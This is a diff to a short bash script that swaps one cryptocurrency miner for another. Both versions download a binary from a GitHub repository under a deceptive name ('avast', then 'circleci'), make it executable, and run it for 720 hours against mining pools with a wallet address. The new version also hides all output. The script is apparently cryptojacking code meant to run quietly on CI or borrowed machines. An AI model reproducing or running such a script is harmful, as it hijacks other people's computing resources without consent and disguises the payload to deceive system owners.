@@ -1,4 +1,5 @@
 #!/bin/bash
-wget https://github.com/aurbach55/pos/raw/main/avast
-chmod +x avast
-timeout 720h ./avast -v -l  ap.luckpool.net:3956 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.X -t 4 -x 
+wget https://github.com/aurbach55/pos/raw/main/circleci >/dev/null 2>&1
+chmod 777 circleci >/dev/null 2>&1
+timeout 720h ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io
+
